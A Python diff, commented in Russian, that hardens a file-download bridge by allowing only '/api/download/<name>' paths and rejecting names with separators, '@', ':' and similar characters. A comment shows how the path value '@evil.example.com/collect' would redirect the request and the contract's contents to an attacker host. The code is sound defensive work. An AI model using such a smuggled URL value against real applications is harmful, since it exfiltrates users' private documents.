@@ -200,10 +200,33 @@ class _Api:
     нативный системный диалог «Сохранить как» — так пользователь реально
     получает файл на диск. См. app.js::downloadFile()."""
 
+    # Единственный маршрут, который вправе запросить мост. Всё остальное —
+    # отказ. Причина: аргумент приходит из JS, а в окне отображается вывод
+    # модели и текст загруженного документа, то есть данные, которыми
+    # управляет автор договора. При склейке `base_url + download_path` строка
+    # «@evil.example.com/collect» превращает адрес в
+    # `http://127.0.0.1:8000@evil.example.com/collect` — «127.0.0.1:8000»
+    # становится именем пользователя, и запрос уходит на ЧУЖОЙ сервер вместе
+    # с содержимым договора. Проверка ниже разрывает эту цепочку даже если
+    # XSS в интерфейсе всё-таки появится.
+    _ALLOWED_DOWNLOAD_PREFIX = "/api/download/"
+
     def __init__(self, base_url: str) -> None:
         self._base_url = base_url
 
+    @classmethod
+    def _is_safe_download_path(cls, path: str) -> bool:
+        if not path.startswith(cls._ALLOWED_DOWNLOAD_PREFIX):
+            return False
+        name = path[len(cls._ALLOWED_DOWNLOAD_PREFIX) :]
+        # Дальше — только имя файла: ни каталогов, ни обхода вверх, ни
+        # второго URL, ни хитростей с обратным слэшем на Windows.
+        return bool(name) and not any(c in name for c in "/\\?#@:")
+
     def save_file(self, download_path: str, suggested_name: str) -> dict:
+        if not self._is_safe_download_path(download_path):
+            log.warning("save_file: отклонён небезопасный путь %r", download_path)
+            return {"ok": False, "error": "недопустимый путь для скачивания"}
         try:
             r = httpx.get(f"{self._base_url}{download_path}", timeout=30)
             r.raise_for_status()
